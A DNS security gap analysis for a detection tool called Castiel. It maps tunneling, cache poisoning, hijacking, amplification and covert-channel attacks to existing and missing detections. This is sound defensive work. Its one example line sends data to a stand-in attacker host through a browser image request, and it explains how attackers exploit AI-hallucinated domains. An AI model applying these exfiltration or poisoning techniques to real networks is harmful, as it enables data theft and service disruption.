# Castiel DNS Attack Gap Analysis

## Comprehensive Research Against MITRE ATT&CK, Academic Papers, and Red Team Tooling

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Current Castiel Coverage](#2-current-castiel-coverage)
3. [MITRE ATT&CK DNS Technique Mapping](#3-mitre-attck-dns-technique-mapping)
4. [Gap Analysis: Attacks Not Yet Covered](#4-gap-analysis-attacks-not-yet-covered)
5. [Emerging and Advanced Attack Vectors](#5-emerging-and-advanced-attack-vectors)
6. [Recommended Implementation Priorities](#6-recommended-implementation-priorities)
7. [References](#7-references)

---

## 1. Executive Summary

This document presents a thorough gap analysis of Castiel's DNS attack detection capabilities against the full spectrum of known DNS attack techniques. The analysis draws from:

- **MITRE ATT&CK Framework** (v19, 2025-2026) — Enterprise techniques T1071.004, T1568.001/.002/.003, T1572
- **Academic Security Research** — CCS, USENIX Security, NDSS, IEEE S&P papers from 2018-2026
- **Red Team Tooling** — dnscat2, iodine, SiphonDNS, Cobalt Strike DNS beacon, sliver, DNSStager
- **Threat Intelligence Reports** — Infoblox DNS Threat Landscape 2025, Palo Alto Unit42, Eclypsium Sitting Ducks
- **CVE Database** — Active DNS vulnerabilities from 2020-2026

### Key Findings

| Category | Covered | Partial | Gap | Total |
|---|---|---|---|---|
| **C2 & Tunneling** | 3 | 2 | 4 | 9 |
| **Cache Poisoning** | 1 | 0 | 5 | 6 |
| **DDoS & Amplification** | 2 | 1 | 3 | 6 |
| **Hijacking & Takeover** | 0 | 1 | 5 | 6 |
| **Covert Data Exfiltration** | 1 | 1 | 4 | 6 |
| **Protocol Abuse** | 1 | 0 | 4 | 5 |
| **Total** | **8** | **5** | **25** | **38** |

Castiel currently covers approximately **21%** of the known DNS attack surface. The most critical gaps are in cache poisoning detection, DNS hijacking/takeover detection, and advanced covert channel methods that bypass traditional subdomain-based entropy detection.

---

## 2. Current Castiel Coverage

### Detection Pipeline (10 stages, in order)

| # | Detection | MITRE Mapping | Status |
|---|---|---|---|
| 1 | **Rate Limiting** — Per-IP token bucket + global QPS | T1071.004 (partial) | ✅ Covered |
| 2 | **Zone Transfer Block** — AXFR/IXFR rejection | — | ✅ Covered |
| 3 | **Blocklist Check** — URLhaus, OpenPhish, StevenBlack feeds | — | ✅ Covered |
| 4 | **Tunneling Detection** — Shannon entropy on subdomain labels | T1071.004, T1572 | ✅ Covered |
| 5 | **DGA Detection** — Entropy + consonant ratio + n-gram model | T1568.002 | ✅ Covered |
| 6 | **C2/Fast-Flux Detection** — TTL volatility + IP diversity | T1568.001 (partial) | ⚠️ Partial |
| 7 | **Cache Lookup** — TTL-aware LRU cache | — | ✅ Covered |
| 8 | **Upstream Forward** — Plain DNS or DoH | — | ✅ Covered |
| 9 | **DNSSEC Validation** — Reject bogus responses | — | ✅ Covered |
| 10 | **Rebinding Protection** — Block public FQDNs → RFC1918 IPs | — | ⚠️ Partial |

### What Castiel Detects Well

- **DGA domains** via n-gram statistical model + heuristics (entropy, consonant ratio, digit ratio)
- **DNS tunneling** via Shannon entropy on subdomain labels (high-entropy = tunneling)
- **NXDOMAIN floods** via per-IP rate limiting on NXDOMAIN responses
- **Zone transfer abuse** via AXFR/IXFR blocking
- **DNS rebinding** via RFC1918 range checking on responses
- **Known malicious domains** via threat intel blocklists
- **DNSSEC validation** for cache poisoning mitigation

---

## 3. MITRE ATT&CK DNS Technique Mapping

### T1071.004 — Application Layer Protocol: DNS

**Description:** Adversaries communicate via DNS to evade detection/network filtering by blending with existing traffic. Commands and results embedded in protocol traffic.

| Sub-technique / Pattern | Castiel Coverage | Gap Details |
|---|---|---|
| DNS tunneling via subdomain encoding | ✅ Covered | Shannon entropy on subdomain labels detects high-entropy encoded data |
| DNS beaconing via TXT/A records | ⚠️ Partial | C2 detector checks TTL volatility but doesn't specifically detect TXT-record-based beaconing patterns |
| DNS tunneling via EDNS0 options | ❌ Gap | SiphonDNS-style exfiltration via EDNS Client Subnet, DNS cookies, SVCB records — no subdomain entropy to detect |
| DoH-based covert C2 channel | ❌ Gap | DoH traffic to public resolvers (dns.google.com, cloudflare-dns.com) hides malicious domain queries inside HTTPS. Castiel uses DoH for upstream but cannot detect malicious DoH clients on the network |
| DNS tunneling via record types (NULL, TXT, CNAME, MX) | ⚠️ Partial | Entropy detector checks subdomain labels but doesn't inspect response record types for tunneling patterns |
| Low-and-slow DNS exfiltration | ❌ Gap | FrameworkPOS-style low-throughput exfiltration (3 bytes/query, hours apart) bypasses rate limiting and entropy thresholds |
| Browser-based DNS exfiltration | ❌ Gap | JavaScript DNS prefetching / img.src exfiltration — no subdomain entropy if data encoded in query timing or volume |

### T1568.001 — Fast Flux DNS

**Description:** Rapidly changing IP addresses linked to a single domain, using round-robin + short TTL.

| Pattern | Castiel Coverage | Gap Details |
|---|---|---|
| Single-flux (A record rotation) | ⚠️ Partial | C2 detector tracks TTL volatility and IP diversity, but doesn't specifically implement fast-flux detection logic (IP rotation rate, ASN diversity) |
| Double-flux (NS record rotation) | ❌ Gap | No detection for NS record rotation — double-flux provides additional resilience by rotating nameservers themselves |
| Flux-botnet networks | ❌ Gap | No correlation of multiple domains resolving to overlapping IP sets (botnet flux network mapping) |

### T1568.002 — Domain Generation Algorithms

**Description:** DGA for dynamic C2 domain identification rather than static IP/domain lists.

| Pattern | Castiel Coverage | Gap Details |
|---|---|---|
| Classical DGA (random character strings) | ✅ Covered | n-gram model + entropy + consonant ratio |
| Dictionary-based DGA (real word concatenation) | ⚠️ Partial | n-gram model may catch some, but "quietlampriverstone.net" has low entropy and looks like a small business website. Dictionary coverage analysis not implemented |
| Sparse DGA (3 queries/hour) | ❌ Gap | NXDOMAIN burst detection won't trigger — need per-host NXDOMAIN ratio over longer windows (24h rolling) |
| RDGA (Registered DGA — pre-registered domain sets) | ❌ Gap | Infoblox 2025 report: "algorithmically pre-registered domain sets" — domains registered in bulk using algorithms but not used for C2 until needed. No active DNS query pattern to detect — needs WHOIS/registration correlation |
| DGA with DoH | ❌ Gap | DGA queries over DoH are invisible to network-layer DNS monitoring |

### T1568.003 — DNS Calculation

**Description:** Adversaries perform calculations on DNS response IP addresses to determine C2 port numbers, bypassing egress filtering.

| Pattern | Castiel Coverage | Gap Details |
|---|---|---|
| Port calculation from IP octets (APT12) | ❌ Gap | Formula: `port = (octet1 * octet2) + octet3`. Castiel doesn't correlate DNS responses with subsequent network connections to detect calculated port usage |
| IP address calculation | ❌ Gap | Using calculated IP from DNS response (not the actual returned IP) for C2 connection |
| Multi-formula variants | ❌ Gap | APT12 uses multiple formulas; `port = octet1 * (octet2 + octet3)` also documented |

### T1572 — Protocol Tunneling

**Description:** Tunneling network communications through DNS to bypass network filtering.

| Pattern | Castiel Coverage | Gap Details |
|---|---|---|
| DNS tunneling (iodine, dnscat2, dns2tcp) | ✅ Covered | Entropy detection on subdomain labels |
| TCP-over-DNS | ⚠️ Partial | Entropy may detect, but specific TCP-over-DNS pattern (NULL record usage, specific byte patterns) not checked |
| DoH tunneling (iodine over DoH, dnscat2 over DoH) | ❌ Gap | DNS queries encapsulated in HTTPS — invisible to Castiel's DNS proxy |
| Cobalt Strike DNS beacon | ⚠️ Partial | Cobalt Strike uses common prefixes (www, post, api) with encoded subdomains — may bypass entropy if prefix is low-entropy |

---

## 4. Gap Analysis: Attacks Not Yet Covered

### 4.1 DNS Cache Poisoning Attacks

#### 4.1.1 Kaminsky Attack (Classic, 2008)

- **MITRE:** N/A (pre-ATT&CK, but foundational)
- **Mechanism:** Attacker queries random subdomain (`random-xyz.bank.com`) to trigger fresh resolver query, then floods resolver with forged responses containing poisoned NS records redirecting the entire zone.
- **Castiel Coverage:** ⚠️ Partial — DNSSEC validation catches forged responses, but Castiel doesn't detect the attack pattern itself (flood of NXDOMAIN responses for random subdomains of a specific domain).
- **Detection Gap:** No detection for "Kaminsky probe pattern" — burst of random subdomain queries for a single apex domain followed by spoofed response flood.
- **Recommended Detection:** Monitor for sudden burst of random-looking subdomain queries for a single apex domain within a short time window (seconds). Alert on NXDOMAIN burst per-domain (not just per-IP).

#### 4.1.2 SAD DNS (Side Channel AttackeD DNS, 2020)

- **MITRE:** Related to T1568 (Dynamic Resolution)
- **Mechanism:** Uses ICMP global rate limit as a side channel to infer the ephemeral source port of DNS resolvers. Once the port is known, only the 16-bit TXID needs to be brute-forced — reducing attack from ~4 billion guesses to ~65K.
- **Affected Software:** BIND, Unbound, dnsmasq on Linux 3.18-5.10; also Windows Server 2019+, macOS 10.15+, FreeBSD 12.1+
- **Castiel Coverage:** ❌ Gap — Castiel operates as a DNS proxy/forwarder, not a recursive resolver, so it's not directly vulnerable. However, it doesn't detect SAD DNS attack patterns targeting upstream resolvers.
- **Detection Gap:** No detection for ICMP-based port scanning patterns that indicate SAD DNS reconnaissance.
- **Mitigation:** DoH upstream (already supported) eliminates the UDP surface. DNSSEC (already supported) validates response authenticity. However, Castiel should detect when its upstream resolver may be under attack (unusual response patterns, sudden increase in SERVFAIL responses).

#### 4.1.3 SAD DNS v2 (CCS 2021)

- **Mechanism:** Improved side channel using ICMP error messages (not UDP probes) to infer ephemeral ports. Affects 38% of open resolvers by frontend IP, including OpenDNS and Quad9.
- **Castiel Coverage:** ❌ Gap — Same as SAD DNS v1.
- **Note:** Linux kernel patches in 5.10+ randomize ICMP rate limits to mitigate. Castiel should recommend running on patched kernels.

#### 4.1.4 RebirthDay Attack (CCS 2025)

- **Mechanism:** Revives the classic DNS Birthday attack by exploiting weaknesses in EDNS Client Subnet (ECS) option coherence checks. Bypasses DNS query aggregation mechanisms that were supposed to prevent Birthday attacks. Affects 18/22 mainstream DNS software including BIND, Unbound, PowerDNS, dnsmasq, Pi-hole.
- **Impact:** 16 router vendors, 14 public DNS services, 365K (15%) open resolvers vulnerable. 50 CVEs assigned.
- **Castiel Coverage:** ❌ Gap — Castiel doesn't implement query aggregation or ECS coherence checks. As a forwarder, it may pass through ECS options without validation.
- **Detection Gap:** No detection for RebirthDay attack patterns — multiple identical queries with different ECS options from the same source.
- **Recommended Detection:** Monitor for queries with varying ECS option values for the same domain from the same client within a short window. Strip or normalize ECS options before forwarding.

#### 4.1.5 Fragmentation-Based Cache Poisoning (ICANN 2021)

- **Mechanism:** Attacker crafts a spoofed 2nd IP fragment containing malicious DNS response data. When the resolver receives a fragmented DNS response (triggered by oversized EDNS0 response), it reassembles using the attacker's 2nd fragment if IPIDs match.
- **Affected:** DNS forwarders (home routers, dnsmasq), systems with incremental or hash-based IPID counters (Windows 10, Ubuntu).
- **Castiel Coverage:** ❌ Gap — Castiel doesn't inspect IP fragmentation patterns or detect fragmentation-based injection attempts.
- **Detection Gap:** No detection for oversized DNS responses that trigger fragmentation. No IPID prediction detection.
- **Recommended Detection:** Limit EDNS0 UDP payload size to 1232 bytes (RFC recommendation) to avoid fragmentation. Drop fragmented UDP DNS responses. Force TCP for large responses.

#### 4.1.6 PRNG State Recovery Attack (USENIX Security 2026)

- **Mechanism:** Attacker reconstructs the PRNG state of DNS resolvers (BIND 9.18/9.20/9.21) by observing RRset permutations and TXID values. Once PRNG state is known, attacker can predict exact source port and TXID for cache poisoning with minimal spoofed traffic.
- **Impact:** "In full effect at the time of writing" (2026). Affects BIND 9.18, 9.20, 9.21 — the most widely deployed DNS software.
- **Castiel Coverage:** ❌ Gap — Castiel doesn't use BIND's PRNG, but if it forwards to a BIND resolver, the upstream is vulnerable.
- **Detection Gap:** No detection for PRNG state recovery patterns — systematic querying of resolver to observe RRset ordering.
- **Recommended Detection:** Randomize RRset order in Castiel's own responses. Detect patterns of queries designed to extract PRNG state (rapid ANY queries, systematic type queries for unassigned types).

#### 4.1.7 TUDOOR Attack (IEEE S&P 2024)

- **Mechanism:** Exploits logic vulnerabilities in DNS response pre-processing with malformed packets. Can inject arbitrary fake responses into vulnerable resolvers (including Microsoft DNS) in less than one second. Also identifies PRNG vulnerabilities in Technitium DNS, AdGuard, CoreDNS.
- **Castiel Coverage:** ❌ Gap — Castiel doesn't specifically validate incoming DNS response packets for malformed structures that could exploit pre-processing logic.
- **Detection Gap:** No malformed packet detection in DNS response handling.
- **Recommended Detection:** Strict validation of all DNS response packets before processing. Reject responses with malformed headers, impossible RD lengths, or out-of-bailiwick records.

### 4.2 DNS Hijacking & Domain Takeover

#### 4.2.1 Sitting Ducks Attack (Eclypsium/Infoblox 2024)

- **Mechanism:** Exploits lame DNS delegation + weak DNS provider ownership verification. Attacker claims a domain at a DNS provider without proving ownership to the actual domain registrar. Estimated 1M+ exploitable domains, 30K+ confirmed hijacked since 2019.
- **Castiel Coverage:** ❌ Gap — No detection for domains with lame delegation or inconsistent registrar/DNS provider relationships.
- **Detection Gap:** Cannot detect at the DNS proxy level — requires passive DNS correlation and WHOIS data.
- **Recommended Detection:** Maintain a feed of known-hijacked domains (Infoblox/Eclypsium disclosures). Flag domains that suddenly change nameserver infrastructure. Alert on domains resolving to IPs geographically inconsistent with their historical patterns.

#### 4.2.2 Dangling CNAME / Dangling DNS Records

- **Mechanism:** Organization decommissions cloud service (Azure, AWS S3) but leaves CNAME record pointing to the decommissioned resource. Attacker registers the abandoned cloud resource and inherits the DNS trust of the parent domain.
- **Real-world examples:** `ahbazuretestapp.cdc.gov` → hijacked Azure endpoint (Hazy Hawk threat actor, 2025). `marthastewart.msn.com` → hijacked via unregistered CNAME target.
- **Castiel Coverage:** ❌ Gap — No detection for CNAME chains that terminate at unregistered/non-existent domains.
- **Detection Gap:** No CNAME chain validation. No detection for CNAME records pointing to cloud service endpoints (azurewebsites.net, s3.amazonaws.com, cloudfront.net) that may be dangling.
- **Recommended Detection:** When resolving a CNAME chain, check if the terminal domain returns NXDOMAIN. Alert on CNAME chains ending at cloud service domains. Maintain a watchlist of CNAME targets that are known-dangling patterns.

#### 4.2.3 Domain Shadowing / Subdomain Hijacking

- **Mechanism:** Attacker gains access to a domain owner's DNS provider account and creates stealthy malicious subdomains under a legitimate domain. Used for C2, phishing, and malware delivery while inheriting the parent domain's reputation.
- **Palo Alto Unit42 (2024):** Separate detector for domain shadowing processing 167M new DNS records/day, identified 6,729 hijacking incidents in 6 months.
- **Castiel Coverage:** ❌ Gap — No detection for newly-created subdomains under previously-quiet parent domains.
- **Detection Gap:** No baseline of subdomain patterns per domain. No detection for sudden appearance of new subdomains under a domain that previously had few/no subdomains.
- **Recommended Detection:** Track subdomain count per apex domain over time. Alert when a domain that historically had N subdomains suddenly shows N+10 new subdomains. Flag subdomains with high entropy under legitimate parent domains (possible C2 channel "living off legitimate domains").

#### 4.2.4 Phantom Squatting (AI Hallucinated Domains)

- **Mechanism:** LLMs frequently hallucinate domain names for real organizations. Adversaries probe LLMs, register the hallucinated domains (18-51 day adversarial exploitation window), and weaponize them for phishing/malware. No phishing email needed — the LLM itself delivers the victim to the attacker.
- **CSA Research Note (2026):** "Autonomous agents that act on LLM-generated URLs without verification create attack paths requiring no human decision point."
- **Castiel Coverage:** ❌ Gap — No detection for phantom-squatted domains. These domains may have legitimate-looking structure and won't appear on traditional blocklists.
- **Detection Gap:** No correlation with LLM-generated domain patterns. No detection for domains that are recently registered and match known LLM hallucination patterns.
- **Recommended Detection:** Maintain a feed of known LLM-hallucinated domains. Flag newly-registered domains (<30 days) that match organization name patterns but have no established web presence. Cross-reference with WHOIS registration dates.

#### 4.2.5 Ghost Domain Names (NDSS 2012, CVE-2020-12244, CVE-2022-30256)

- **Mechanism:** Attacker keeps a revoked/malicious domain continuously resolvable by piggybacking new delegation data with fresh TTL values onto cached DNS entries before they expire. The domain remains in resolver caches indefinitely, even after removal from the domain registry.
- **Impact:** 93% of experimental DNS resolvers vulnerable. BIND, most public DNS servers affected. MaraDNS had a variant (CVE-2022-30256) allowing unintended domain resolution.
- **PowerDNS Recursor (2026):** New TOCTOU race condition (EUVD-2026-47932) enables ghost domain NS record injection when slow authoritative server response arrives after cache expiry.
- **Castiel Coverage:** ❌ Gap — Castiel's cache doesn't specifically prevent TTL extension via piggybacked delegation data.
- **Detection Gap:** No detection for TTL values on NS records that exceed expected maximums. No detection for delegation data refresh patterns that indicate ghost domain persistence.
- **Recommended Detection:** Enforce maximum TTL caps on NS records. Detect when NS record TTLs are refreshed with higher values than the original. Alert on domains that remain in cache beyond their expected TTL expiration + grace period.

#### 4.2.6 DNS Hijacking via Rogue Resolver / Router Compromise

- **Mechanism:** Attacker compromises router or DHCP server to set the network's DNS resolver to a malicious server. All DNS queries then flow through attacker-controlled infrastructure.
- **MITRE:** T1071.004 (DNS), T1565.001 (Stored Data Manipulation)
- **Castiel Coverage:** ⚠️ Partial — Castiel operates as the local DNS proxy, so if installed and configured correctly, it intercepts all DNS traffic regardless of upstream changes. However, it doesn't detect when system DNS settings have been tampered with.
- **Detection Gap:** No detection for unauthorized changes to system DNS settings. No alerting when DNS queries bypass Castiel and go directly to an external resolver.
- **Recommended Detection:** Monitor system DNS settings for unauthorized changes. Detect DNS traffic on port 53 that bypasses the local proxy (network-level detection). Alert on queries to non-Castiel DNS resolvers.

### 4.3 Advanced DDoS & Amplification

#### 4.3.1 DNSBOMB (2024)

- **Mechanism:** A pulsing DoS attack that exploits DNS query aggregation and EDNS0 to create bandwidth amplification factors of 10,000x-21,881x. Attacker accumulates DNS queries, then releases them simultaneously with oversized EDNS0 responses (4,096 bytes), creating devastating traffic bursts.
- **Impact:** Unbound: 2.9 Gb/s burst (21,881x BAF). Yandex DNS: 876.2 Mb/s (10,834x BAF). Affects all major DNS software.
- **Castiel Coverage:** ❌ Gap — Rate limiting is per-IP and per-query, but doesn't detect query aggregation patterns that precede DNSBOMB bursts.
- **Detection Gap:** No detection for coordinated query accumulation patterns. No EDNS0 response size monitoring.
- **Recommended Detection:** Monitor EDNS0 UDP payload size in queries. Alert when multiple clients send queries with large EDNS0 buffer sizes (4096+) within a short window. Implement response rate limiting (RRL) for oversized responses.

#### 4.3.2 DNS Reflection/Amplification via Open Resolvers

- **Mechanism:** Attacker sends DNS queries with spoofed source IP (victim's IP) to open DNS resolvers. Resolvers send amplified responses to the victim. ANY and TXT queries produce the largest amplification (8.1% and 3.4% of open resolvers support large responses).
- **2024 Research:** 14.9% of open resolvers still susceptible. 2.6M+ open resolvers exist. 20% of potent resolvers contribute 80% of amplification potential.
- **Castiel Coverage:** ⚠️ Partial — Rate limiting catches high-volume queries from single sources, but doesn't specifically detect reflection attack patterns (queries with forged source IPs).
- **Detection Gap:** No detection for queries that appear to be reflection probes (ANY queries with large EDNS0 buffer sizes from unexpected sources). No source address validation (BCP 38).
- **Recommended Detection:** Monitor for ANY-type queries with large EDNS0 buffer sizes — these are amplification attack indicators. Implement response rate limiting. Limit response size for ANY queries. Reject queries with EDNS0 buffer size > 1232 bytes.

#### 4.3.3 DNS Water Torture (Random Subdomain Attack)

- **Mechanism:** DDoS attack against authoritative DNS servers using random non-existent subdomains (`fake1.google.com`, `fake2.google.com`). Random subdomains bypass resolver caches, so all queries reach the authoritative server. Used by Mirai botnet against Dyn (2016).
- **Castiel Coverage:** ⚠️ Partial — Per-IP NXDOMAIN rate limiting catches high-volume attackers, but doesn't detect distributed water torture (many IPs each sending few NXDOMAIN queries for the same apex domain).
- **Detection Gap:** No per-domain NXDOMAIN rate limiting (only per-IP). No detection for coordinated NXDOMAIN campaigns against a single apex domain from distributed sources.
- **Recommended Detection:** Implement per-domain NXDOMAIN rate limiting (not just per-IP). Track NXDOMAIN ratio per apex domain. Alert when a single apex domain receives >N NXDOMAIN queries/minute from multiple distinct IPs. Use Naive Bayes classifier on subdomain randomness (95.59% detection rate per published research).

#### 4.3.4 TsuKing Coordinated Amplification (2023)

- **Mechanism:** Coordinates multiple open resolvers and specific query patterns to create potent DoS amplifiers. Uses a combination of query types and timing to maximize amplification beyond traditional reflection attacks.
- **Castiel Coverage:** ❌ Gap — No detection for coordinated multi-resolver amplification patterns.
- **Detection Gap:** No correlation of query patterns across multiple source IPs targeting the same domain.
- **Recommended Detection:** Correlate query patterns across multiple source IPs. Detect synchronized query bursts targeting the same domain from distributed sources.

### 4.4 Advanced Covert Channels

#### 4.4.1 EDNS0-Based Exfiltration (SiphonDNS, 2025)

- **Mechanism:** Data exfiltration via non-standard EDNS0 options instead of subdomains, completely bypassing traditional subdomain-based entropy detection:
  - **EDNS Client Subnet (ECS):** 3 bytes per query encoded as fake client subnet. Forwarded by Google/OpenDNS to authoritative server. Undetectable by subdomain entropy.
  - **DNS Cookie (RFC 7873):** Up to 32 bytes hex-encoded per query. Not forwarded to authoritative server by public resolvers, but usable with direct resolver connection.
  - **SVCB/HTTPS records:** Data hidden in SVCB request parameters. Can poll for commands via SVCB/HTTPS record responses.
  - **EDNS0 option codes:** Custom/unused option codes can carry arbitrary data.
- **Castiel Coverage:** ❌ Gap — Entropy detection only examines subdomain labels. EDNS0 options are not inspected for data exfiltration.
- **Detection Gap:** No EDNS0 option inspection. No detection for ECS values that don't match the client's actual subnet. No detection for unusual DNS cookie patterns. No SVCB record analysis.
- **Recommended Detection:**
  - Parse and inspect EDNS0 options in all DNS queries.
  - Validate ECS option against client's actual IP subnet. Flag mismatches.
  - Monitor DNS cookie size and entropy. Alert on cookies >8 bytes.
  - Track SVCB/HTTPS record query patterns. Alert on unusual SVCB parameter values.
  - Alert on unknown/custom EDNS0 option codes.

#### 4.4.2 DoH-Based Covert C2 (ChamelDoH, Godlua, PsiXbot)

- **Mechanism:** Malware uses public DoH resolvers (dns.google.com, cloudflare-dns.com) to resolve C2 domains, hiding DNS queries inside HTTPS. Network-level DNS monitoring is completely bypassed.
- **Known malware:** Godlua (first DoH malware, 2019), PsiXbot (uses dns.google.com JSON API), FluBot (Android banking malware), ChamelDoH (APT campaign).
- **Castiel Coverage:** ❌ Gap — Castiel uses DoH for its own upstream, but cannot detect when other applications on the network use DoH to bypass its DNS proxy.
- **Detection Gap:** No detection for DoH traffic to public resolvers that bypasses Castiel. No TLS fingerprinting of DoH clients. No detection for DoH-based C2 patterns.
- **Recommended Detection:**
  - Block direct DoH access to public resolvers at the firewall level (force all DNS through Castiel).
  - Detect DoH traffic patterns via TLS fingerprinting (JA3/JA4 hashes for known DoH clients).
  - Monitor for HTTPS connections to known DoH resolver IPs (8.8.8.8:443, 1.1.1.1:443, 9.9.9.9:443).
  - Alert on applications other than Castiel making DoH requests.

#### 4.4.3 GAN-Enhanced DNS Exfiltration (DOLOS, 2024)

- **Mechanism:** Uses a Generative Adversarial Network (GAN) to generate DNS exfiltration queries that are statistically indistinguishable from benign DNS traffic. The GAN discriminator continuously learns to distinguish exfiltration from benign traffic, and the generator evolves to fool it.
- **Impact:** Bypasses all ML-based DNS exfiltration detectors that rely on statistical features (entropy, query volume, label length). Adapts exfiltration rate to stay below host-specific volume thresholds.
- **Castiel Coverage:** ❌ Gap — Castiel's entropy-based tunneling detection would be bypassed by DOLOS-generated queries that mimic benign traffic patterns.
- **Detection Gap:** No adversarial ML detection. No detection for queries that are specifically crafted to evade statistical detection.
- **Recommended Detection:** This is a hard problem. Possible approaches:
  - Monitor for low-and-slow exfiltration patterns (data exfiltration over extended periods).
  - Use volume-based detection (total bytes exfiltrated per domain over 24h window) rather than per-query features.
  - Implement adversarial training in ML detectors.
  - Use information-theoretic approaches to estimate exfiltrated data volume, not just per-query classification.

#### 4.4.4 Browser-Based DNS Exfiltration (2010-2025)

- **Mechanism:** JavaScript in a malicious web page generates DNS queries via:
  - **DNS prefetching:** Dynamically creating `<a>` elements with `href` pointing to `data.attacker.com` — browser automatically resolves the domain.
  - **Image src:** Setting `img.src = "http://data.attacker.com/pixel.png"` triggers DNS resolution.
  - **fetch() API:** DNS resolution occurs before HTTP connection.
  - **CORS preflight:** OPTIONS requests trigger DNS resolution.
- **Advantage:** No additional software needed. Works in any browser. Leaves minimal filesystem trace.
- **Castiel Coverage:** ❌ Gap — Castiel sees the DNS queries but cannot distinguish browser-generated prefetch queries from legitimate DNS lookups. The subdomain may have normal entropy if data is encoded as query timing or volume rather than subdomain content.
- **Detection Gap:** No browser-process correlation. No detection for DNS prefetch patterns (rapid sequential queries to different subdomains of the same domain).
- **Recommended Detection:** Track query patterns per process (where possible via OS-level DNS client mapping). Alert on rapid sequential queries to different subdomains of a single domain from the same client IP within seconds. Monitor for DNS query patterns that correlate with web browsing sessions.

#### 4.4.5 Low-and-Slow DNS Exfiltration (FrameworkPOS, Backdoor.Win32.Denis)

- **Mechanism:** Malware exfiltrates data at extremely low rates (3 bytes per query, hours apart) to stay below volumetric detection thresholds. FrameworkPOS used this technique to steal 56M credit cards from Home Depot (2014).
- **Research:** "An entire class of low throughput DNS exfiltration malware has been overlooked" — detected at 1-in-50,000 false positive rate when using domain-behavior-based anomaly detection.
- **Castiel Coverage:** ❌ Gap — Rate limiting won't trigger (queries are hours apart). Entropy detection may not trigger (3 bytes per query doesn't create high-entropy subdomains).
- **Detection Gap:** No long-window domain behavior analysis. No detection for domains used exclusively for data exchange (no other legitimate traffic patterns).
- **Recommended Detection:** Track domain behavior over 24h+ windows. Flag domains that:
  - Receive queries from only one or few clients.
  - Have no web browsing pattern (no A record queries followed by HTTP connections).
  - Show consistent but low-volume query patterns over extended periods.
  - Are newly registered or have no established reputation.

#### 4.4.6 DNS Covert Timing Channels

- **Mechanism:** Data encoded in the timing between DNS queries rather than in the query content. Binary data represented as inter-query delays (e.g., short delay = 0, long delay = 1).
- **Castiel Coverage:** ❌ Gap — No inter-query timing analysis. All detection is content-based (entropy, domain structure).
- **Detection Gap:** No timing-based covert channel detection.
- **Recommended Detection:** Track inter-query timing patterns per client-domain pair. Alert on regular/periodic query patterns that indicate timing-based encoding. Use statistical tests (Kolmogorov-Smirnov, chi-square) to detect non-random timing distributions.

### 4.5 Protocol-Level Attacks

#### 4.5.1 DNS 0x20 Encoding Bypass

- **Mechanism:** 0x20 encoding randomizes letter case in DNS queries (`GoOgLe.CoM`) to add entropy and prevent cache poisoning. Some implementations don't properly validate 0x20 in responses, allowing attackers to bypass this defense.
- **Castiel Coverage:** ❌ Gap — Castiel doesn't implement 0x20 encoding for its own queries, and doesn't validate 0x20 in responses from upstream.
- **Detection Gap:** No 0x20 implementation or validation.
- **Recommended Detection:** Implement 0x20 encoding for outbound queries. Validate that response case matches query case. Reject responses with mismatched 0x20 encoding.

#### 4.5.2 DNS Bomb / Query Aggregation Abuse

- **Mechanism:** (See 4.3.1) Exploits DNS query aggregation mechanism to amplify responses. The aggregation feature, designed to prevent Birthday attacks, is itself exploited to concentrate and amplify traffic.
- **Detection Gap:** No monitoring of query aggregation behavior or EDNS0 response size patterns.

#### 4.5.3 Malformed Packet Attacks (TUDOOR)

- **Mechanism:** (See 4.1.7) Malformed DNS response packets exploit pre-processing logic vulnerabilities in DNS software.
- **Detection Gap:** No strict validation of DNS response packet structure before processing.

#### 4.5.4 DNSSEC Downgrade Attacks

- **Mechanism:** Attacker forces fallback to non-DNSSEC resolution by:
  - Setting DO (DNSSEC OK) bit to 0 in queries.
  - Stripping DNSSEC records from responses.
  - Causing DNSSEC validation failures via timing attacks.
  - Exploiting "DNSSEC aware but not validating" configurations.
- **Castiel Coverage:** ⚠️ Partial — Castiel has DNSSEC validation but doesn't detect downgrade attempts.
- **Detection Gap:** No detection for DNSSEC downgrade patterns. No alerting when DNSSEC validation suddenly starts failing for domains that previously validated.
- **Recommended Detection:** Track DNSSEC validation success/failure per domain. Alert when a previously-validating domain starts failing validation. Monitor for queries with DO bit cleared. Alert on responses missing expected RRSIG records.

#### 4.5.5 NXDOMAIN Response Injection / CNAME Loop

- **Mechanism:** Attacker injects NXDOMAIN responses for legitimate domains to cause DoS, or creates CNAME loops that cause resolver resource exhaustion.
- **CVE-2020-12244:** PowerDNS Recursor issue where NXDOMAIN responses in answer section could be improperly cached.
- **Castiel Coverage:** ❌ Gap — No detection for NXDOMAIN injection patterns or CNAME loop detection.
- **Detection Gap:** No CNAME loop detection. No NXDOMAIN response validation against query domain.
- **Recommended Detection:** Validate that NXDOMAIN responses match the queried domain (not out-of-bailiwick). Detect CNAME chains that loop back to previously-visited domains. Limit CNAME chain depth (currently no explicit limit).

---

## 5. Emerging and Advanced Attack Vectors

### 5.1 Traffic Distribution Systems (TDS) via DNS

- **Source:** Infoblox DNS Threat Landscape Report 2025
- **Mechanism:** Threat actors use DNS to redirect users through multiple intermediary layers based on geolocation, device type, or security posture. Over 1 million domains used by 168 malicious adtech operators. TDS provides evasion by routing through seemingly legitimate infrastructure.
- **Castiel Coverage:** ❌ Gap — No detection for TDS redirect chains.
- **Recommended:** Track multi-hop DNS redirect patterns. Flag domains that serve as redirect intermediaries with high domain churn.

### 5.2 Lookalike Domain Detection (Homograph/IDN Attacks)

- **Source:** Infoblox 2025, Palo Alto Unit42 2024
- **Mechanism:** Attacker registers lookalike domains using:
  - Homoglyphs (`rnicrosoft.com` vs `microsoft.com`)
  - IDN/punycode (`xn--microsoft.com` rendering as `microsoft.com`)
  - Typosquatting (`microsft.com`)
  - Different TLDs (`microsoft.net`)
- **Castiel Coverage:** ❌ Gap — No lookalike domain detection. Blocklists may catch some, but new lookalikes appear faster than feeds update.
- **Recommended:** Implement homoglyph detection (Unicode confusables). Compare queried domains against a whitelist of popular domains using edit distance (Levenshtein distance ≤ 2). Flag IDN domains that decode to lookalikes of popular domains.

### 5.3 DoH/DoT Protocol Abuse Detection

- **Source:** Multiple research papers (2022-2025)
- **Mechanism:** DoH and DoT are increasingly used by malware to hide DNS traffic. Key challenge: distinguishing legitimate DoH (browser, OS) from malicious DoH (malware C2).
- **Detection Approaches:**
  - TLS fingerprinting (JA3/JA4) of DoH clients.
  - Traffic analysis: DoH session patterns differ between browsers and malware.
  - Statistical features: packet size, inter-arrival time, burst patterns.
  - ML-based classification (99.73% accuracy reported with FF-MR method).
